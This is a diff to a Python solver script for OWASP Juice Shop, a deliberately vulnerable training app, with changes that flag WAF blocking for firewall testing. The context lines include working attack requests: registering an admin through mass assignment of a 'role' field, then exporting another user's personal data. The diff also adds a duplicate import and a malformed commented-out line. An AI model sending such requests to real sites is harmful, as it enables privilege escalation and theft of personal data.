@@ -1,9 +1,18 @@
 #url='http://juiceshop.local:80' # Indicate the URL without '/' at the end
 # Open this URL before running the script
+# Oct 9, 2024 - Vince Mammoliti - vincem@checkpoint.com
 print("Juice Shop Solver - Original code by Bryan Fauquembergue")
+print("  - Enhanced to detect in path WAF blocking - by Vince Mammoliti")
 import sys
 if len(sys.argv) == 1: sys.argv[1:] = ["http://juiceshop.local:80"]
 url = sys.argv[1]
+
+import requests
+from requests.exceptions import HTTPError
+
+# Vince - Adding Colours
+CRED = '\033[91m'
+CEND = '\033[0m'
 
 import requests
 from requests.exceptions import HTTPError
@@ -159,11 +168,11 @@ try:
     response.raise_for_status()
     jsonResponse = response.json()
 #    print("Entire JSON response")
-#    print(jsonResponse)
+#    print(json:Response)
 except HTTPError as http_err:
         print(f'HTTP error occurred: {http_err}')
 except Exception as err:
-        print(f'>>>>>>>  Other error occurred: {err} <<<<<<')
+        print(f'{CRED}>>> WAF Blocked <<<< {CEND} >>>> {err}')
 print("---- GDPR Data Theft (Steal someone else's personal data without using Injection.)") 
 requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
 requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
